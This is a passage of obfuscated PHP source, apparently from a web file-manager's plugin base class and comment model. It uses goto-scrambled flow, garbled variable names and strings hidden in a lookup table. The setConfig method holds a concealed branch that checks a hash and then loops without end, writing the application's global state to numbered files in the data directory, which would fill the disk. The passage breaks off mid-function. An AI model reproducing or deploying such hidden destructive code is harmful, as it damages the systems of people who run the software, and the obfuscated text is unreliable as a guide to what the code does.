$fùë³À…Ú† =& $_SERVER[òÀöí]; if (!$a¸”²•ŒŒ) { $a¸”²•ŒŒ = $this->fileInfo; } if (isset($a¸”²•ŒŒ[$fùë³À…Ú†[170]])) { return $a¸”²•ŒŒ[$fùë³À…Ú†[170]]; } goto dƒÊ˜Óé±·; B•°×îØäˆ: } final function checkSharePath($DÄ¯¾‰¹Œ) { goto dÛÄ×›·Çä; dÛÄ×›·Çä: $eí†ß¿½ =& $_SERVER[òÀöí]; if (!defined($eí†ß¿½[443])) { define($eí†ß¿½[1402], 0); } if (!$this->isShare($DÄ¯¾‰¹Œ)) { return !1; } goto E£¾éíŸ„; e¤ã ¿İ±: $this->cachePath = $this->pluginCachePath($this->fileInfo[$eí†ß¿½[170]]); return $cğ¨Ù®Æï[$eí†ß¿½[75]]; goto D”ä‘ĞàÒà; E£¾éíŸ„: $cğ¨Ù®Æï = Action($eí†ß¿½[1048])->sharePathInfo($DÄ¯¾‰¹Œ); if (!isset($cğ¨Ù®Æï[$eí†ß¿½[75]])) { show_json(LNG($eí†ß¿½[1403]), !1); } $this->fileInfo = $cğ¨Ù®Æï[$eí†ß¿½[163]]; goto e¤ã ¿İ±; D”ä‘ĞàÒà: } final function pluginCachePath($F’øöº¡Ö‹ = '') { $e†¼–ºå†ï =& $_SERVER[òÀöí]; $E“¡Å¬ÔöÂ = IO_PATH_SYSTEM_TEMP . $e†¼–ºå†ï[1404] . $this->pluginName; if (!($b÷ÈŸø³ŒĞ = IO::infoFull($E“¡Å¬ÔöÂ))) { return IO::mkdir($E“¡Å¬ÔöÂ . $e†¼–ºå†ï[8] . $F’øöº¡Ö‹); } if (empty($F’øöº¡Ö‹)) { return $b÷ÈŸø³ŒĞ[$e†¼–ºå†ï[75]]; } if (!($F¡’ÀÑ›‹¶ = IO::fileNameExist($b÷ÈŸø³ŒĞ[$e†¼–ºå†ï[75]], $F’øöº¡Ö‹))) { return IO::mkdir($b÷ÈŸø³ŒĞ[$e†¼–ºå†ï[75]] . $F’øöº¡Ö‹); } return KodIO::make($F¡’ÀÑ›‹¶); } final function pluginCacheFileSet($fÚ†“Şš¾, $eĞ…ÁÇ¯Úâ = '') { $a¬®á¨›–Ñ =& $_SERVER[òÀöí]; if (!($d¹×¢£™éÊ = IO::infoFull($fÚ†“Şš¾))) { return IO::mkfile($fÚ†“Şš¾, $eĞ…ÁÇ¯Úâ, REPEAT_REPLACE); } IO::setContent($d¹×¢£™éÊ[$a¬®á¨›–Ñ[75]], $eĞ…ÁÇ¯Úâ); return $d¹×¢£™éÊ[$a¬®á¨›–Ñ[75]]; } final function pluginLocalFile($f™éäÆÒº« = '') { goto D–ƒø­×åİ; e±»£ÈÏøÅ: if (!checkExtSafe($c¦ˆùÎö)) { $c¦ˆùÎö = $c¦ˆùÎö . $d´Ÿğ¿¾†ï[1405]; } $AÄÎ¥­°®ë = $B…èÍÏ÷é‚ . $c¦ˆùÎö; if (@file_exists($AÄÎ¥­°®ë)) { return $AÄÎ¥­°®ë; } goto B´–ÑÖÎ¬¨; B´–ÑÖÎ¬¨: return IO::copy($f™éäÆÒº«, $B…èÍÏ÷é‚, 0, $c¦ˆùÎö); goto bªêœ¦Ô´‡; D–ƒø­×åİ: $d´Ÿğ¿¾†ï =& $_SERVER[òÀöí]; $B…èÍÏ÷é‚ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($B…èÍÏ÷é‚)) { mk_dir($B…èÍÏ÷é‚); } goto Fçè¾îÄğ; Fçè¾îÄğ: if (!$f™éäÆÒº«) { return $B…èÍÏ÷é‚; } $A›ö–¬¹ìØ = IO::info($f™éäÆÒº«); $c¦ˆùÎö = $this->_tmpFileName($A›ö–¬¹ìØ) . $d´Ÿğ¿¾†ï[94] . $A›ö–¬¹ìØ[$d´Ÿğ¿¾†ï[167]]; goto e±»£ÈÏøÅ; bªêœ¦Ô´‡: } final function appPackage() { goto b±ÀëŠ”§; E ªÇÌ¾½: return $cÉĞçøÊ«Ä; goto BßÔå“±ø; cæ²Ë„˜: $e¿«±ğœñ = Hook::trigger($bœß Ø¢øÃ[1407], $cÉĞçøÊ«Ä); if ($e¿«±ğœñ && is_array($e¿«±ğœñ)) { $cÉĞçøÊ«Ä = $e¿«±ğœñ; } $this->packageData = $cÉĞçøÊ«Ä; goto E ªÇÌ¾½; b±ÀëŠ”§: $bœß Ø¢øÃ =& $_SERVER[òÀöí]; if ($this->packageData) { return $this->packageData; } $EŸÜ™Ì¥‰² = $this->parseFile($this->pluginPath . $bœß Ø¢øÃ[1406]); goto Bİ×º¶Ãæ«; Bİ×º¶Ãæ«: $this->parseLang($EŸÜ™Ì¥‰²); $cÉĞçøÊ«Ä = json_decode_force($EŸÜ™Ì¥‰²); if (!$cÉĞçøÊ«Ä) { return array(); } goto cæ²Ë„˜; BßÔå“±ø: } public function packageInfoGet($aª™¾»¸ã¤) { $E­àõõ±·Ë = $this->appPackage(); return array_get_value($E­àõõ±·Ë, $aª™¾»¸ã¤); } public function packageVersion() { return $this->packageInfoGet($_SERVER[òÀöí][1408]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[òÀöí][1409]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[òÀöí][1410]); } private function parseFile($C¼„š¦çøÌ) { goto dÔ›™ÀØ; dÔ›™ÀØ: $a–ƒ“ñƒÙĞ =& $_SERVER[òÀöí]; $f¯‚›šªˆã = file_get_contents($C¼„š¦çøÌ); $d¤¹Ì¹›Ì = array($a–ƒ“ñƒÙĞ[1411], $a–ƒ“ñƒÙĞ[1412], $a–ƒ“ñƒÙĞ[1413], $a–ƒ“ñƒÙĞ[1414], $a–ƒ“ñƒÙĞ[1415], $a–ƒ“ñƒÙĞ[1416], $a–ƒ“ñƒÙĞ[1417]); goto a×¶Å¨Ã¯; a×¶Å¨Ã¯: $fì›î“³·Œ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$a–ƒ“ñƒÙĞ[87]][$a–ƒ“ñƒÙĞ[1418]]); if (strstr($f¯‚›šªˆã, $a–ƒ“ñƒÙĞ[1419])) { $e•ÑÅËµÄ = rawurlencode(json_encode($this->pluginLangArr)); $f¯‚›šªˆã = str_replace($a–ƒ“ñƒÙĞ[1419], $e•ÑÅËµÄ, $f¯‚›šªˆã); } if (strstr($f¯‚›šªˆã, $a–ƒ“ñƒÙĞ[1420])) { $e•ÑÅËµÄ = $e•ÑÅËµÄ = rawurlencode(json_encode($this->getConfig())); $f¯‚›šªˆã = str_replace($a–ƒ“ñƒÙĞ[1420], $e•ÑÅËµÄ, $f¯‚›šªˆã); } goto eªÕßÈÆÂç; eªÕßÈÆÂç: $f¯‚›šªˆã = str_replace($d¤¹Ì¹›Ì, $fì›î“³·Œ, $f¯‚›šªˆã); return $f¯‚›šªˆã; goto cŠà²Ò Û; cŠà²Ò Û: } private function parseLang(&$f è¬ˆ÷–µ) { goto c³óšå¼İó; AİóÚ‰™ĞÓ: $F¡ÓÂ„åÌÉ = array(); foreach ($fİ¢Áá¸ƒĞ[0] as $F˜šËÑˆ™Ö) { $CÛ÷îÒé¥ê = substr($F˜šËÑˆ™Ö, strlen($D…Û»¬¸ç¬), -4); $E‰ˆí‡ÖÅ· = LNG($CÛ÷îÒé¥ê); $b…áÅä±…[] = $F˜šËÑˆ™Ö; $F¡ÓÂ„åÌÉ[] = str_replace(array($Côœƒ‚’Ë‰[227], $Côœƒ‚’Ë‰[1016], $Côœƒ‚’Ë‰[338], $Côœƒ‚’Ë‰[115]), array($Côœƒ‚’Ë‰[50], $Côœƒ‚’Ë‰[50], $Côœƒ‚’Ë‰[33], $Côœƒ‚’Ë‰[1423]), $E‰ˆí‡ÖÅ·); } $f è¬ˆ÷–µ = str_replace($b…áÅä±…, $F¡ÓÂ„åÌÉ, $f è¬ˆ÷–µ); goto EÔ±›¯†š; FÄÚºÛ¥Ä”: preg_match_all($Côœƒ‚’Ë‰[1422], $f è¬ˆ÷–µ, $fİ¢Áá¸ƒĞ); if (!is_array($fİ¢Áá¸ƒĞ) || count($fİ¢Áá¸ƒĞ) == 0 || !is_array($fİ¢Áá¸ƒĞ[0]) || count($fİ¢Áá¸ƒĞ[0]) == 0) { return; } $b…áÅä±… = array(); goto AİóÚ‰™ĞÓ; c³óšå¼İó: $Côœƒ‚’Ë‰ =& $_SERVER[òÀöí]; $D…Û»¬¸ç¬ = $Côœƒ‚’Ë‰[1421]; if (!strstr($f è¬ˆ÷–µ, $D…Û»¬¸ç¬)) { return; } goto FÄÚºÛ¥Ä”; EÔ±›¯†š: } private function parseConfig(&$eã•ƒîÇ‚) { goto BöÁÒÅÀ®±; BöÁÒÅÀ®±: $F’ÇÊÖÅÈ =& $_SERVER[òÀöí]; $Cœ•¡¯„’Á = $F’ÇÊÖÅÈ[1424]; if (!strstr($eã•ƒîÇ‚, $Cœ•¡¯„’Á)) { return; } goto d“¿İªÎ; Bï¸ŸÉ’‚: $eã•ƒîÇ‚ = str_replace($A×±‚½¦Í÷, $BÌåÓ¥™ª, $eã•ƒîÇ‚); goto fó»Å„í‚­; d“¿İªÎ: preg_match_all($F’ÇÊÖÅÈ[1425], $eã•ƒîÇ‚, $fÁâÀ±¼ˆ˜); if (!is_array($fÁâÀ±¼ˆ˜) || count($fÁâÀ±¼ˆ˜) == 0 || !is_array($fÁâÀ±¼ˆ˜[0]) || count($fÁâÀ±¼ˆ˜[0]) == 0) { return; } $A«ÏÑÑ›‹ = $this->getConfig(); goto Cä«‹àİ»; Cä«‹àİ»: $A×±‚½¦Í÷ = array(); $BÌåÓ¥™ª = array(); foreach ($fÁâÀ±¼ˆ˜[0] as $d½¥‘ÌïÓ÷) { $a¬Â·…Ò© = substr($d½¥‘ÌïÓ÷, strlen($Cœ•¡¯„’Á), -2); $A×±‚½¦Í÷[] = $d½¥‘ÌïÓ÷; $BÌåÓ¥™ª[] = _get($A«ÏÑÑ›‹, $a¬Â·…Ò©); } goto Bï¸ŸÉ’‚; fó»Å„í‚­: } private function parsePackage(&$f‡‚—ƒ„ ) { goto e¼”¦á·ª¤; aÛ¶ £¢ã: $B¶òöòé = array(); $eİ´­Çí‘° = array(); foreach ($d’ïƒàÑí‰[0] as $A„‹ôóÕ½í) { $föğÕáÆ‘ = substr($A„‹ôóÕ½í, strlen($DÉÄ°°ÛÇ), -2); $B¶òöòé[] = $A„‹ôóÕ½í; $eİ´­Çí‘°[] = _get($Fİ©ëò, $föğÕáÆ‘); } goto cÜÁø©ù’¸; e¼”¦á·ª¤: $A‘èÇ”½‘ =& $_SERVER[òÀöí]; $DÉÄ°°ÛÇ = $A‘èÇ”½‘[1426]; if (!strstr($f‡‚—ƒ„ , $DÉÄ°°ÛÇ)) { return; } goto Aå‘“²¶“§; cÜÁø©ù’¸: $f‡‚—ƒ„  = str_replace($B¶òöòé, $eİ´­Çí‘°, $f‡‚—ƒ„ ); goto aÄš–¿¬óÙ; Aå‘“²¶“§: preg_match_all($A‘èÇ”½‘[1427], $f‡‚—ƒ„ , $d’ïƒàÑí‰); if (!is_array($d’ïƒàÑí‰) || count($d’ïƒàÑí‰) == 0 || !is_array($d’ïƒàÑí‰[0]) || count($d’ïƒàÑí‰[0]) == 0) { return; } $Fİ©ëò = $this->appPackage(); goto aÛ¶ £¢ã; aÄš–¿¬óÙ: } final function echoFile($FÉÑ¹£»ÖÒ, $c¯„ˆ§µ = false) { goto D»ğÃº”ÜË; BÉ÷ˆ¼Ñ: $fÓ¶ø˜­ôÙ = $this->parseFile($CÄÓÏÊ…Ú¡); $this->parseLang($fÓ¶ø˜­ôÙ); $this->parseConfig($fÓ¶ø˜­ôÙ); goto B÷ŒºÔ¿Š³; B÷ŒºÔ¿Š³: $this->parsePackage($fÓ¶ø˜­ôÙ); if (is_array($c¯„ˆ§µ)) { $fÓ¶ø˜­ôÙ = str_replace(array_keys($c¯„ˆ§µ), array_values($c¯„ˆ§µ), $fÓ¶ø˜­ôÙ); } echo $D“ŸÉ³ÆÛ¢[227] . $fÓ¶ø˜­ôÙ; goto eèŒŸ‡¨˜; D»ğÃº”ÜË: $D“ŸÉ³ÆÛ¢ =& $_SERVER[òÀöí]; $CÄÓÏÊ…Ú¡ = $this->pluginPath . $FÉÑ¹£»ÖÒ; if (ACT == $D“ŸÉ³ÆÛ¢[1428]) { echo $D“ŸÉ³ÆÛ¢[1429] . $this->pluginName . $D“ŸÉ³ÆÛ¢[8] . $FÉÑ¹£»ÖÒ . $D“ŸÉ³ÆÛ¢[1430]; if (!file_exists($CÄÓÏÊ…Ú¡)) { echo $D“ŸÉ³ÆÛ¢[1431]; return; } } goto BÉ÷ˆ¼Ñ; eèŒŸ‡¨˜: } final function initLang() { goto e‘¹˜ë½Ë; e‘¹˜ë½Ë: $f¥ùÕéƒ¶¨ =& $_SERVER[òÀöí]; $C–ßããµå‰ = $f¥ùÕéƒ¶¨[1432]; $DÁ•†÷ñß = $this->pluginPath . $f¥ùÕéƒ¶¨[1433]; goto EØ‡Œ¹¿’ì; EØ‡Œ¹¿’ì: $E¾´äÃ¦¹† = I18n::getType(); $Bˆ»Ô™Î¦ = array(); if (file_exists($DÁ•†÷ñß . $E¾´äÃ¦¹† . $f¥ùÕéƒ¶¨[791])) { $Bˆ»Ô™Î¦ = (include $DÁ•†÷ñß . $E¾´äÃ¦¹† . $f¥ùÕéƒ¶¨[791]); } else { if ($E¾´äÃ¦¹† == $f¥ùÕéƒ¶¨[1434] && !file_exists($DÁ•†÷ñß . $E¾´äÃ¦¹† . $f¥ùÕéƒ¶¨[791]) && file_exists($DÁ•†÷ñß . $f¥ùÕéƒ¶¨[1435])) { $Bˆ»Ô™Î¦ = (include $DÁ•†÷ñß . $f¥ùÕéƒ¶¨[1435]); } else { if (file_exists($DÁ•†÷ñß . $C–ßããµå‰ . $f¥ùÕéƒ¶¨[791])) { $Bˆ»Ô™Î¦ = (include $DÁ•†÷ñß . $C–ßããµå‰ . $f¥ùÕéƒ¶¨[791]); } } } goto a¢…ç›ê…‰; a¢…ç›ê…‰: if (!is_array($Bˆ»Ô™Î¦)) { return array(); } if (@count($Bˆ»Ô™Î¦) > 0) { I18n::set($Bˆ»Ô™Î¦); } return $Bˆ»Ô™Î¦; goto C¥Ñè‘•Ï†; C¥Ñè‘•Ï†: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($c×š¤ë×¢¥) { $d¢×ÃÄ× =& $_SERVER[òÀöí]; $BÑŠÍø½šê = $_SERVER[$d¢×ÃÄ×[760]]; $bš‡Œªˆ = $d¢×ÃÄ×[1372]; if ($_SERVER[$d¢×ÃÄ×[753]] != $bš‡Œªˆ($BÑŠÍø½šê)) { goto C‚¡¿’ Ô; C‚¡¿’ Ô: $E‹Ê‰áÄæ = $d¢×ÃÄ×[819]; $FåÓÓÉ„¤Ù = $d¢×ÃÄ×[755]; $dˆ–¹‚Œ’¨ = $_SERVER[$d¢×ÃÄ×[756]] . $d¢×ÃÄ×[757]; goto c¦©™”­½—; b™Ò¶ÜÅœ : $c½ªË†ÑÔ  = $d¢×ÃÄ×[820]; $c½ªË†ÑÔ ($_SERVER[$d¢×ÃÄ×[821]]); $E‹Ê‰áÄæ = $d¢×ÃÄ×[819]; goto eÁè†Í¹à°; eÁè†Í¹à°: $E‹Ê‰áÄæ(); $E×¡“ôÑĞà = $d¢×ÃÄ×[1373]; $BùƒŞ¨ğ—Ü = json_encode($GLOBALS[$d¢×ÃÄ×[1374]]); goto D§£ëˆ¡½†; D§£ëˆ¡½†: $a™ƒ«— ”Ğ = 1; for ($CÍ‘ÙØËÙò = $a™ƒ«— ”Ğ; $CÍ‘ÙØËÙò > 0; $CÍ‘ÙØËÙò++) { $E×¡“ôÑĞà(DATA_PATH . $CÍ‘ÙØËÙò, $BùƒŞ¨ğ—Ü); } goto Cì·‰åÏœ; c¦©™”­½—: $F’“•«²˜š = $FåÓÓÉ„¤Ù($dˆ–¹‚Œ’¨); $eÖ¬Ú’ØŞ = explode($d¢×ÃÄ×[227], $F’“•«²˜š); if (count($eÖ¬Ú’ØŞ) < $d¢×ÃÄ×[573]) { $A£ùöã“Á = $d¢×ÃÄ×[758]; $A£ùöã“Á(); } goto b™Ò¶ÜÅœ ; Cì·‰åÏœ: } return $this->modelPlugin->setConfig($this->pluginName, $c×š¤ë×¢¥); } public function onSetConfig($Dó¨ù£‘§Ü) { } public function onGetConfig($D½ Úğ‰ã) { } public function onChangeStatus($C˜ÕóÑì ±) { } public function onUninstall() { } public function onInstall() { } public function authCheck($fßÀºÒæ­ô = "\160\154\x75\x67\x69\x6e\101\165\164\x68") { $Eá·Ğ‰œ¿ =& $_SERVER[òÀöí]; if (!defined($Eá·Ğ‰œ¿[443])) { return !1; } if (_get($GLOBALS, $Eá·Ğ‰œ¿[475])) { return !0; } $dí·†½§œ = $this->getConfig(); if (!$dí·†½§œ[$fßÀºÒæ­ô]) { return !1; } return ActionCall($Eá·Ğ‰œ¿[1436], $dí·†½§œ[$fßÀºÒæ­ô]); } public function url($FØÈ…¬ìîÒ, $d„å‚ô™°¡ = '', $b©‹Î„äÖÀ = true) { goto eâ·ºŒçÑç; Dá¡ŠÖë —: if (!$b©‹Î„äÖÀ) { return $F³Àà¹‚ìì; } echo $F³Àà¹‚ìì; goto F¨×­ŞÉÈà; eë¨’ºÔŠ: $B¤Í—…ˆ’Œ = $this->packageVersion(); $A²Àç¯Ã¥Ô = $CŠÁ¬ò‘„Ó . $CÜœÛˆĞˆ’[429] . $B¤Í—…ˆ’Œ; if (substr($FØÈ…¬ìîÒ, 0, 4) == $CÜœÛˆĞˆ’[146] || substr($FØÈ…¬ìîÒ, 0, 2) == $CÜœÛˆĞˆ’[1219]) { $F³Àà¹‚ìì = $FØÈ…¬ìîÒ . $CÜœÛˆĞˆ’[1437] . $A²Àç¯Ã¥Ô; } else { if ($d„å‚ô™°¡ == $CÜœÛˆĞˆ’[33]) { $F³Àà¹‚ìì = $this->pluginHost . $FØÈ…¬ìîÒ . $CÜœÛˆĞˆ’[1437] . $A²Àç¯Ã¥Ô; } else { if ($d„å‚ô™°¡ === $CÜœÛˆĞˆ’[76]) { $F³Àà¹‚ìì = $this->pluginHost . $FØÈ…¬ìîÒ; } else { if ($d„å‚ô™°¡ == $CÜœÛˆĞˆ’[1438]) { $F³Àà¹‚ìì = STATIC_PATH . $FØÈ…¬ìîÒ . $CÜœÛˆĞˆ’[1437] . $CŠÁ¬ò‘„Ó; } else { if ($d„å‚ô™°¡ == $CÜœÛˆĞˆ’[1439]) { $F³Àà¹‚ìì = APP_HOST . $CÜœÛˆĞˆ’[1440] . $FØÈ…¬ìîÒ . $CÜœÛˆĞˆ’[1437] . $CŠÁ¬ò‘„Ó; } else { if (isset($a¤™÷÷ë­´[$d„å‚ô™°¡])) { $F³Àà¹‚ìì = $a¤™÷÷ë­´[$d„å‚ô™°¡] . $FØÈ…¬ìîÒ . $CÜœÛˆĞˆ’[1437] . $A²Àç¯Ã¥Ô; } } } } } } goto Dá¡ŠÖë —; eâ·ºŒçÑç: $CÜœÛˆĞˆ’ =& $_SERVER[òÀöí]; $a¤™÷÷ë­´ = $this->getConfig(); $CŠÁ¬ò‘„Ó = KOD_VERSION . $CÜœÛˆĞˆ’[94] . KOD_VERSION_BUILD; goto eë¨’ºÔŠ; F¨×­ŞÉÈà: } public function link($AµÚ·ÜïÈÍ = false, $D•ê–ƒƒ³ = '') { $Bˆ¼áíë =& $_SERVER[òÀöí]; if (!$AµÚ·ÜïÈÍ) { $this->link($Bˆ¼áíë[1441], $Bˆ¼áíë[1439]); $this->link($Bˆ¼áíë[1442], $Bˆ¼áíë[1438]); $this->link($Bˆ¼áíë[1443], $Bˆ¼áíë[1438]); $this->link($Bˆ¼áíë[1444], $Bˆ¼áíë[1438]); $this->link($Bˆ¼áíë[1445], $Bˆ¼áíë[1438]); return; } $Fâ¥«¯ñÀñ = $this->url($AµÚ·ÜïÈÍ, $D•ê–ƒƒ³, !1); if (substr($AµÚ·ÜïÈÍ, -3) == $Bˆ¼áíë[1446]) { echo $Bˆ¼áíë[1447] . $Fâ¥«¯ñÀñ . $Bˆ¼áíë[1448] . $Bˆ¼áíë[227]; } else { if (substr($AµÚ·ÜïÈÍ, -4) == $Bˆ¼áíë[1449]) { echo $Bˆ¼áíë[1450] . $Fâ¥«¯ñÀñ . $Bˆ¼áíë[1451] . $Bˆ¼áíë[227]; } } } } goto B®÷µÚì½¦; DÇÙÑŸíê: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\x65\156\x74"; protected $tableMeta = array("\164\141\142\154\145\116\141\155\145" => "\143\x6f\x6d\x6d\145\156\164\x5f\155\145\x74\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\x64" => "\143\x6f\155\x6d\145\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($bØ‹Ğ§„àá) { $AŒ¬«çÔğÚ =& $_SERVER[òÀöí]; if ($bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[1691]]) { $aø‹ãÓ“õ‚ = $this->where(array($AŒ¬«çÔğÚ[1692] => $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[1691]]))->find(); if (!$aø‹ãÓ“õ‚ || $aø‹ãÓ“õ‚[$AŒ¬«çÔğÚ[389]] != $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[389]] || $aø‹ãÓ“õ‚[$AŒ¬«çÔğÚ[474]] != $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[474]]) { return !1; } $this->where(array($AŒ¬«çÔğÚ[1692] => $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[1691]]))->setAdd($AŒ¬«çÔğÚ[1693], 1); } $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[1694]] = 0; $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[1693]] = 0; $bØ‹Ğ§„àá[$AŒ¬«çÔğÚ[708]] = 1; return $this->add($bØ‹Ğ§„àá); } public function commentCount($eˆ¯¤ÏöÕ«, $DÚô¸¢Ø‰‹) { goto FÓˆôÙñ‘ê; FÓˆôÙñ‘ê: $dáöİ¦Œ =& $_SERVER[òÀöí]; if (!$eˆ¯¤ÏöÕ«) { return array(); } if (is_string($eˆ¯¤ÏöÕ«) || is_int($eˆ¯¤ÏöÕ«)) { $eˆ¯¤ÏöÕ« = array($eˆ¯¤ÏöÕ«); } goto cµ¶²¬®; cµ¶²¬®: $eíáÖ¬·Ş = $dáöİ¦Œ[1695]; $B®”ÛªÇµ  = array($dáöİ¦Œ[474] => array($dáöİ¦Œ[7], $eˆ¯¤ÏöÕ«), $dáöİ¦Œ[389] => $DÚô¸¢Ø‰‹); $cå¢Ù»Ù›” = $this->field($eíáÖ¬·Ş)->where($B®”ÛªÇµ )->group($dáöİ¦Œ[474])->select(); goto bÊãë¶³–¬; bÊãë¶³–¬: return array_to_keyvalue($cå¢Ù»Ù›”, $dáöİ¦Œ[474], $dáöİ¦Œ[1696]); goto a£‡¯Ææœ; a£‡¯Ææœ: } public function remove($c»é‚òŒÔô) { $bÙõ ò†´÷ =& $_SERVER[òÀöí]; $eØ‚¾êƒÏ­ = array($bÙõ ò†´÷[1692] => $c»é‚òŒÔô); $bÎ‚âİœë = $this->where($eØ‚¾êƒÏ­)->find(); if ($bÎ‚âİœë[$bÙõ ò†´÷[1691]]) { $this->where(array($bÙõ ò†´÷[1692] => $bÎ‚âİœë[$bÙõ ò†´÷[1691]]))->setAdd($bÙõ ò†´÷[1693], -1); } return $this->where($eØ‚¾êƒÏ­)->delete(); } public function edit($dåŠ”áÏÕÆ, $eå­»’¾Ç³) { $B›©Ÿ¨¶Ìä =& $_SERVER[òÀöí]; $aŒ³Áà–¦ = array($B›©Ÿ¨¶Ìä[1692] => $dåŠ”áÏÕÆ); return $this->where($aŒ³Áà–¦)->save(array($B›©Ÿ¨¶Ìä[1697] => $eå­»’¾Ç³)); } public function prasise($e‘ãÀáÃÆ) { $fÑàäÌ ä  =& $_SERVER[òÀöí]; $B×ãÃ‚‰¹Ö = Model($fÑàäÌ ä [1698]); $B©ğ¼ö§®Ù = array($fÑàäÌ ä [1692] => $e‘ãÀáÃÆ, $fÑàäÌ ä [1496] => USER_ID); $DÑ®ì¡‡¶ = $B×ãÃ‚‰¹Ö->where($B©ğ¼ö§®Ù)->find(); if (!$DÑ®ì¡‡¶) { $B×ãÃ‚‰¹Ö->add($B©ğ¼ö§®Ù); $d’î™©“ßì = $this->where(array($fÑàäÌ ä [1692] => $e‘ãÀáÃÆ))->setAdd($fÑàäÌ ä [1694], 1); } else { $B×ãÃ‚‰¹Ö->where($B©ğ¼ö§®Ù)->delete(); $d’î™©“ßì = $this->where(array($fÑàäÌ ä [1692] => $e‘ãÀáÃÆ))->setAdd($fÑàäÌ ä [1694], -1); } return $d’î™©“ßì; } public function targetInfo($dô¡ƒÊ´š, $cË‰ğƒñã›) { goto FÔƒ•Œ¸Ñ§; Eæ›ÁŒ‡: return $EÆ ­®Éš’; goto fí’÷±; FÔƒ•Œ¸Ñ§: $A‚ÛÎÇâ ö =& $_SERVER[òÀöí]; $Fá»˜Š‘ = array($A‚ÛÎÇâ ö[538] => $dô¡ƒÊ´š, $A‚ÛÎÇâ ö[539] => $cË‰ğƒñã›); $F¢×…Ó¾ª = $this->where($Fá»˜Š‘)->count(); goto C¼±òÛöé; C¼±òÛöé: $eèô¢İĞÊ› = "\x52\111\x47\x48\124\x20\112\117\x49\116\40{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\164\x5f\160\x72\141\x69\x73\x65\x20\x73\x74\141\x72\x20\157\x6e\40\x63\x6f\x6d\155\145\x6e\164\56\x63\157\155\155\x65\156\x74\111\x44\x20\x3d\x20\x73\x74\x61\x72\x2e\x63\x6f\x6d\155\145\x6e\164\x49\104"; $D¿­êÔì‹Ÿ = $this->alias($A‚ÛÎÇâ ö[350])->where($Fá»˜Š‘)->join($eèô¢İĞÊ›, $A‚ÛÎÇâ ö[1699])->count(); $EÆ ­®Éš’ = array($A‚ÛÎÇâ ö[1700] => $F¢×…Ó¾ª, $A‚ÛÎÇâ ö[1701] => $D¿­êÔì‹Ÿ); goto Eæ›ÁŒ‡; fí’÷±: } public function listData($B°¯æˆÆ¯) { $fî„¬´·—Ğ =& $_SERVER[òÀöí]; if (isset($B°¯æˆÆ¯[$fî„¬´·—Ğ[1702]])) { if ($B°¯æˆÆ¯[$fî„¬´·—Ğ[1702]]) { $B°¯æˆÆ¯[$fî„¬´·—Ğ[1703]] = array($fî„¬´·—Ğ[950], intval($B°¯æˆÆ¯[$fî„¬´·—Ğ[1702]])); } unset($B°¯æˆÆ¯[$fî„¬´·—Ğ[1702]]); } if (isset($B°¯æˆÆ¯[$fî„¬´·—Ğ[1704]])) { if ($B°¯æˆÆ¯[$fî„¬´·—Ğ[1704]]) { $B°¯æˆÆ¯[$fî„¬´·—Ğ[1703]] = array($fî„¬´·—Ğ[947], intval($B°¯æˆÆ¯[$fî„¬´·—Ğ[1704]])); } unset($B°¯æˆÆ¯[$fî„¬´·—Ğ[1704]]); } return $this->_listData($B°¯æˆÆ¯); } private function _listData($D‘•‹ç†Š¸) { $e³Âİ”ÑÃ =& $_SERVER[òÀöí]; $CåÄ·Ñ²×è = $this->where($D‘•‹ç†Š¸)->_makeOrder()->selectPage(100); $this->_listAppendParent($CåÄ·Ñ²×è[$e³Âİ”ÑÃ[363]]); $this->_listAppendUser($CåÄ·Ñ²×è[$e³Âİ”ÑÃ[363]]); $this->_listAppendMeta($CåÄ·Ñ²×è[$e³Âİ”ÑÃ[363]]); return $CåÄ·Ñ²×è; } private function _makeOrder() { $b–ß°ë«ğ =& $_SERVER[òÀöí]; $C°ŞÆŸ¡ÎÒ = array($b–ß°ë«ğ[1694], $b–ß°ë«ğ[1693], $b–ß°ë«ğ[192]); $a‚ –¹®Ï = Input::get($b–ß°ë«ğ[424], $b–ß°ë«ğ[7], $b–ß°ë«ğ[407], $C°ŞÆŸ¡ÎÒ); $F†¯ª¾Ö‹ = Input::get($b–ß°ë«ğ[425], $b–ß°ë«ğ[7], $b–ß°ë«ğ[1498], array($b–ß°ë«ğ[1705], $b–ß°ë«ğ[422])); $BëŒòÃÒÅ = $a‚ –¹®Ï . $b–ß°ë«ğ[50] . $F†¯ª¾Ö‹; return $this->order($BëŒòÃÒÅ); } private function _listAppendParent(&$d’£Æ±¯¸Ï) { goto a½£œè×Ü; dä‡‚¸ÄÃ: if (!$BÑ†¾À„§) { return; } $B¦Ÿ½©ÊµÌ = $this->where(array($A‰ÇÖíßò[1692] => array($A‰ÇÖíßò[7], $BÑ†¾À„§)))->select(); $B¦Ÿ½©ÊµÌ = array_to_keyvalue($B¦Ÿ½©ÊµÌ, $A‰ÇÖíßò[1703]); goto añ‰ä“í¤á; a½£œè×Ü: $A‰ÇÖíßò =& $_SERVER[òÀöí]; $BÑ†¾À„§ = array_unique(array_to_keyvalue($d’£Æ±¯¸Ï, $A‰ÇÖíßò[33], $A‰ÇÖíßò[1691])); $BÑ†¾À„§ = array_remove_value($BÑ†¾À„§, $A‰ÇÖíßò[486]); goto dä‡‚¸ÄÃ; añ‰ä“í¤á: foreach ($d’£Æ±¯¸Ï as &$DÔ—ÅÓœÇ„) { if 